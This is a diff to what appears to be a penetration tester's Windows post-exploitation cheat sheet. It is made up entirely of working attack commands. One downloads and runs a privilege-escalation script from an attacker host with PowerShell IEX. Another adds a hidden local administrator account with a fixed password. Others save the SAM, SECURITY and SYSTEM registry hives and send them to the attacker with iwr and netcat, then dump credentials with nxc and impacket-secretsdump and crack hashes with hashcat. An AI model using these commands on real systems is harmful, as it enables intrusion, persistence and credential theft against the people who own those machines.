@@ -1010,24 +1010,28 @@ Windows 10 Pro          {3c6859ce-230b-48a4-be6c-932c0c202048}     TrustedInstal
 powershell -c "IEX (New-Object Net.WebClient).DownloadString('http://$MYIP:8888/windows/Invoke-SigmaPotato.ps1');Invoke-SigmaPotato -Command \"whoami /user /priv\""
 
 +---------- Dump Hashes (Local / Remote)----------+
+net user dbf 123qweasdF! /add && net localgroup Administrators dbf /add
+
 cd c:\programdata; reg save hklm\sam sam; reg save hklm\security security; reg save hklm\system system
 
+iwr http://$MYIP:4444 -Method POST -InFile ".\sam"
 cmd /c "nc.exe $MYIP 4444 -w 3 < sam"
 nc -lvp 4444 > sam
+iwr http://$MYIP:4444 -Method POST -InFile ".\security"
 cmd /c "nc.exe $MYIP 4444 -w 3 < security"
 nc -lvp 4444 > security
+iwr http://$MYIP:4444 -Method POST -InFile ".\system"
 cmd /c "nc.exe $MYIP 4444 -w 3 < system"
 nc -lvp 4444 > system
+
+nxc smb $TARGET -u 'dbf' -p '123qweasdF!' --local-auth --sam --lsa --dpapi
 
 impacket-secretsdump -sam sam -system system -security security LOCAL
 echo 'Administrator:500:...................' > hashes
 hashcat -m 1000 -a 0 hashes /usr/share/wordlists/rockyou.txt
 
-
-
 powershell -c "(Get-WmiObject Win32_ComputerSystem).Domain"
 impacket-secretsdump $DOM/'$USERNAME':'$PASSWORD'@$TARGET
-
 
 +---------- File Permissions ----------+
 powershell -c "(Get-Acl 'C:\secret.txt').Access | Format-Table"
